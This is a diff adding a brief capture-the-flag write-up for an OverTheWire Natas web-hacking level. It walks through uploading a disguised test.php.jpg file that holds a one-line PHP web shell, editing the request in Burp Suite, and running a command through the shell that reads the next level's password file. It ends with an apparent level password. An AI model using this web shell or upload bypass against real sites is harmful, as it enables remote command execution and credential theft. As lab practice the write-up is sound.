@@ -1,0 +1,16 @@
+This level was very easy, i felt really confident beacose i've pacticed malicious file upload many times before.
+However it wasn't complicated, i just created an php.jpg file and before i upload this file, i fired up burpSuite to capure the request.
+
+This is the procedure:
+	-> create a file
+		-> touch test.php.jpg
+			-> inside this file we write "magic numbers" (ask google), followed by some php code
+				-> <?php system($_GET['c']); ?> (once this code gets uploaded we can give "c" whatever code we want, like= ..?c=whoami)
+	-> click "upload" 
+	-> capture the request with burpsuite and modify some headers just to be sure.
+	-> forward the request and index the file uploaded
+
+We should see something like http://natas11.natas.labs.overthewiere.org/uploads/21dw21f1.php?c=cat /etc/natas_webpass/natas13
+and the password popping!
+
+jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
